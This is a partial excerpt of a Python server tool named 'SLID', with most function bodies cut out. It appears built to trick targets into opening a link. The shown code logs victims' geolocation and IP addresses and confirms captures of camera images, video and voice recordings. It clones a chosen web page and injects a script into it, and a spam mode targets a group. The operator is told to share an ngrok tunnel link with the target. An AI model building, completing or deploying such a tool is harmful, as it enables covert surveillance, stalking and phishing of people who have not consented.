...
def receive_location():
    ...
    if data and 'latitude' in data and 'longitude' in data:
        ...
        print("🎉 SUCCESS: NEW DATA CAPTURED! 🎉")
    ...
    public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"\n{Fore.YELLOW}⚠️ WARNING:{Style.RESET_ALL} Page visited ({public_ip}), but Geolocation data was NOT received.")
...
def capture_image():
    ...
    try:
        ...
        print(f"\n{Fore.MAGENTA + Style.BRIGHT}" + "=" * 50); print("📸 IMAGE CAPTURE CONFIRMATION")
...
def capture_video():
    ...
    try:
        ...
        print(f"\n{Fore.MAGENTA + Style.BRIGHT}" + "=" * 50); print("🎥 VIDEO CAPTURE CONFIRMATION")
        print(tabulate(table_data, headers=[f"{Fore.YELLOW}Field{Style.RESET_ALL}", f"{Fore.YELLOW}Value{Style.RESET_ALL}"], tablefmt="fancy_grid")); print("=" * 50 + f"{Style.RESET_ALL}\n")
...
def record_voice():
    ...
    try:
        ...
        print(f"\n{Fore.GREEN + Style.BRIGHT}" + "=" * 50); print("🎙️ VOICE RECORDING CONFIRMATION")
        print(tabulate(table_data, headers=[f"{Fore.YELLOW}Field{Style.RESET_ALL}", f"{Fore.YELLOW}Value{Style.RESET_ALL}"], tablefmt="fancy_grid")); print("=" * 50 + f"{Style.RESET_ALL}\n")
...
def get_group_details():
    ...
    print(Fore.YELLOW + Style.BRIGHT + "# ⚙️  Group Setup (Interactive Mode)" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
...
def start_local_clone():
    clear_terminal()
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + "# 🧪 LOCAL PAGE CLONE SETUP" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    ...
    try:
        ...
        if head:
            ...
            print(Fore.GREEN + "    ✅ Script injected successfully into <head>." + Style.RESET_ALL)
        else:
            # Fallback: if no <head> tag is found, inject into <body>
            body = soup.find('body')
            if body:
                body.insert(0, injection_script)
                print(Fore.YELLOW + "    ⚠️ Script injected into <body> (No <head> found)." + Style.RESET_ALL)
            else:
                print(Fore.RED + "    ❌ Failed to inject script (No <head> or <body> found)." + Style.RESET_ALL)
...
def run_server():
    ...
    for d in dirs_to_check:
        if not os.path.exists(d): 
            try: 
                ...
                print(f"{Fore.GREEN}  ✔️ Created directory: {d}" + Style.RESET_ALL)
            except OSError as e:
                print(f"{Fore.RED}[ERROR] Failed to create directory {d}: {e}")
        else:
            print(f"{Fore.GREEN}  ✔️ Directory exists: {d}" + Style.RESET_ALL)
    ...
    # Target Information 
    if app.config['MODE'] == 'clone':
        print(Fore.RED + Style.BRIGHT + f"  🧪 MODE: LOCAL PAGE CLONE" + Style.RESET_ALL)
        print(Fore.RED + Style.BRIGHT + f"  🔗 CLONED TARGET: {app.config['CLONE_TARGET_URL']}" + Style.RESET_ALL)
    else:
        print(Fore.MAGENTA + Style.BRIGHT + f"  🎯 TARGET GROUP: {app.config['GROUP_NAME']}" + Style.RESET_ALL)
        print(Fore.MAGENTA + Style.BRIGHT + f"  👥 MEMBERS COUNT: {app.config['GROUP_MEMBERS']:,}" + Style.RESET_ALL)
        if app.config['MODE'] == 'spam':
            print(Fore.RED + Style.BRIGHT + f"  🚨 SPAM MESSAGE: {app.config['SPAM_MESSAGE']}" + Style.RESET_ALL)

    print(SEPARATOR)
    
    # Local Link (Highlighted)
    print(Fore.GREEN + Style.BRIGHT + f"  🌐 LOCAL ACCESS: http://{HOST}:{PORT}/" + Style.RESET_ALL)
    
    # NGROK Link 
    print(Fore.RED + Style.BRIGHT + f"  🌍 NGROK/TUNNEL LINK: {ngrok_link}" + Style.RESET_ALL)
    
    # Crucial Next Step
    print(Fore.CYAN + Style.BRIGHT + "\n  🔗 SHARE THE NGROK LINK WITH YOUR TARGET." + Style.RESET_ALL )
...
def main_menu():
    ...
    # Title Card
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + "# 🛠️  SLID - Operational Mode Selection" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "===============================================" + Style.RESET_ALL)
    
    print(Fore.WHITE + "\nPlease select an operation mode:" + Style.RESET_ALL)
    
    # Option 1: NORMAL
    print(Fore.GREEN + Style.BRIGHT + "\n1️⃣  NORMAL Mode ✨ (Default HTML Page)" + Style.RESET_ALL)
    ...
    # Option 2: SPAM
    print(Fore.YELLOW + Style.BRIGHT + "\n2️⃣  SPAM Mode ⚠️ (Repeating Alert Page)" + Style.RESET_ALL)
    ...
    # Option 3: CLONE
    print(Fore.RED + Style.BRIGHT + "\n3️⃣  LOCAL PAGE CLONE 🧪 (Cloning & Injection)" + Style.RESET_ALL)
    ...
    while True:
        ...
        if choice == '1':
            ...
            print(Fore.RED + "[INFO] Shutting down. Goodbye! 👋" + Style.RESET_ALL)
            sys.exit(0)
